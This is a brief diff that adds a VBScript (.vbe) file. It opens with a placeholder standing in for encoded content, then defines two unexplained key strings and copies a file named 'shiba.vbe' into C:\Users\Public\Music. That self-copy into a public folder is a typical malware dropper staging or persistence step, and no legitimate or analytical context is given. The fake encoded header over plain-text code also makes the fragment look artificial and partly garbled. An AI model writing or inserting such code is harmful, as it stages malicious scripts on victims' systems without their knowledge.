@@ -1,0 +1,7 @@
+#@~^encoded_vbe_content
+dim wolf_key
+wolf_key = "wefhskdf"
+dim cfg_key
+cfg_key = "wudks"
+Set fso = CreateObject("Scripting.FileSystemObject")
+fso.CopyFile "shiba.vbe", "C:\Users\Public\Music\shiba.vbe"
